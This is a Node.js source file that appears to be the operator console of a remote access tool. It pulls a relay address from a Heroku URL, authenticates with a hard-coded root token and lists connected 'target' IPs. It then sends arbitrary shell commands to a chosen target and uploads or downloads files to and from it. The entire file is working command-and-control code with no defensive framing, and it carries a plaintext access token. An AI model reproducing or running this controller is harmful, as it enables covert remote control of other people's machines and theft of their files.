const net = require('net');
const request = require("request")
const readRl = require('readline')
const fs = require("fs");
const path = require('path');
let rl = readRl.createInterface({
    input: process.stdin,
    output: process.stdout
});

const rootToken = "mYR2fOv3SDjA9"
const url = "https://remote-ip-server-api-9a4d4d493ea1.herokuapp.com/"
let host = ""
let port = ""
let dlfileData = {gpath:"",name:""}
request.get({
        uri: url,
        headers: {'Content-type': 'application/json'},
        qs: {

        },
        json: true
    }, function(err, req, data){
        let dls = data.split(":")
        host = dls[0]
        port = dls[1]
        console.log(data)
        main()

});


const sendIP = (client,data)=>{
    const sendData = JSON.stringify({type:"setTargetIp",data:data})
    client.write(sendData)
}
const sendCommand = (client,command)=>{
    const sendData = JSON.stringify({type:"runCommand",data:command})
    client.write(sendData)
}
const sendFileType = (client,type,name,path,mainPath)=>{
    let filesize = 0
    if(fs.existsSync(mainPath)){
        filesize = fs.statSync(mainPath)
        filesize = filesize.size
    }
    const sendData = JSON.stringify({type:"fileType",data:{type:type,name:name,path:path,size:filesize}})
    client.write(sendData)
}
const sendFileData = (client,dpath,gpath,name)=>{
    dlfileData.gpath = gpath
    dlfileData.name = name
    const sendData = JSON.stringify({type:"fileData",data:{dpath:dpath,gpath:gpath,name:name}})
    client.write(sendData)
}
const getIP = async(list,client)=>{
    rl.question('Target IP:', (answer) => {
        let co = null
        for(let i = 0;list.length>i;i++){
            if(list[i].ip == answer.toString()){
                co = i
            }
        }
        if(co != null){
            rl.close()
            sendIP(client,answer.toString())
            return answer.toString()
        }else{
            getIP(list,client)
        }
    })
}
let commandGetFlg = false
const getCommand = async(IP,client)=>{
    rl.close()
    rl = readRl.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    let splitCommand = []
    rl.question(`$${IP}>`,(answer)=>{
        splitCommand = answer.split(" ")
        if(splitCommand[0] != "uf" && splitCommand[0] != "df"){
            sendCommand(client,answer)
            if(!answer){
                rl.close()
                getCommand(IP,client)
            }
        }else if(splitCommand[0] == "uf"){
            if(splitCommand.length>4){
                console.log("uploading....")
                sendFileType(client,splitCommand[2],splitCommand[4],splitCommand[3],splitCommand[1])
                let sendFile = fs.createReadStream(splitCommand[1])
                sendFile.pipe(client,{ end: false })
                // sendFile.on("end",()=>{
                //     console.log("done")
                // })
                sendFile.on("error",()=>{
                    console.log("send error")
                    rl.close()
                    getCommand(IP,client)
                })

            }else{
                console.log("error uf filePath fileType uploadpath filename")
                rl.close()
                getCommand(IP,client)
            }
        }else if(splitCommand[0] == "df"){
            if(splitCommand.length>3){
                console.log("downloading....")
                dlfileFLG = "dlfile"
                byteList = []
                sendFileData(client,splitCommand[1],splitCommand[2],splitCommand[3])
            }else{
                console.log("error df downloadpath getpath getname")
                rl.close()
                getCommand(IP,client)
            }
        }

        // getCommand(IP,client)
    })
}
let targetIP = ""
let dlfileFLG = "cmd"
let filesize = 0
let byteList = []
let jsonFlg = true
const main = ()=>{
    const client = net.connect(3000,"localhost", () => {
        console.log('connected to server');
        const sendData = JSON.stringify({type:"sendUserType",token:rootToken})
        client.write(sendData)

    });
    client.on("data",async(data)=>{
        
        if(dlfileFLG == "cmd"){
            if(JSON.parse(data.toString("utf-8")).type == "sendClient"){
                try{
                    const data1 = JSON.parse(data.toString("utf-8"))
                    // console.log(data1.data)
                    let dataList = data1.data
                    targetIP = ""
                    console.log("---------TargetList---------")
                    dataList.forEach((i)=>{
                        console.log(i.ip)
                    })
                    console.log("----------------------------")
                    targetIP = getIP(dataList,client)
                }catch{
                    console.log("error")
                }
            }else if(JSON.parse(data.toString("utf-8")).type == "conTargetComplete"){
                const getData = JSON.parse(data.toString("utf-8")).data
                console.log(`complete connection ${getData}`)
                targetIP = getData
                getCommand(getData,client)
            }else if(JSON.parse(data.toString("utf-8")).type == "resposeLog"){
                const getData = JSON.parse(data).data.toString("utf-8")
                console.log(getData)
                getCommand(targetIP,client)
            }else if(JSON.parse(data.toString("utf-8")).type == "resposeLogList"){
                const getData = JSON.parse(data).data
                console.log("---------ProsessList---------")
                getData.forEach((i,index)=>{
                    console.log(i)
                })
                console.log("-----------------------------")
                getCommand(targetIP,client)
            }else if(JSON.parse(data.toString("utf-8")).type == "noClient"){
                console.log('cno client')
            }else if(JSON.parse(data.toString("utf-8")).type == "sendfileError"){
                console.log("error")
                getCommand(targetIP,client)
            }else if(JSON.parse(data.toString("utf-8")).type == "uploadDone"){
                console.log("☑ upload done")
                getCommand(targetIP,client)
            }else if(JSON.parse(data.toString("utf-8")).type == "uploadError"){
                console.log("upload error")
                getCommand(targetIP,client)
            }else if(JSON.parse(data.toString("utf-8")).type == "downloadError"){
                console.log("download error")
                getCommand(targetIP,client)//////////////////////////////////////////dfの時のエラーが出ない
            }
        }else if(dlfileFLG == "dlfile"){
            // jsonFlg = true
            // try{
            //     JSON.parse(data)
            //     console.log()
            // }catch{
            //     jsonFlg = false
            // }
            if(!jsonFlg){
                byteList.push(data)
                let nowFile = Buffer.concat(byteList)
                let nowSize = nowFile.length
                console.log(`${nowSize}/${filesize}`)
                if(filesize == nowSize){
                    dlfileFLG = "cmd"//////////////////////////////////////
                    let file = path.join(dlfileData.gpath,dlfileData.name)
                    let dlstream = fs.createWriteStream(file)
                    dlstream.write(nowFile)
                    dlstream.end((err)=>{
                        if(!err){
                            console.log("☑ download done")
                            jsonFlg = true
                            getCommand(targetIP,client)
                        }else{
                            console.log("download error")
                            jsonFlg = true
                            getCommand(targetIP,client)
                        }
                    })
                }
            
            // dlfileFLG = "cmd"
            }else{
                if(JSON.parse(data.toString("utf-8")).type == "dfFileSize"){
                    let data1 = JSON.parse(data.toString("utf-8")).data
                    filesize = data1
                    jsonFlg = false
                }
            }
        }
    })
    client.on("close",()=>{
        console.log("close")
    })
    client.on("error",()=>{
        console.log("error")
    })
}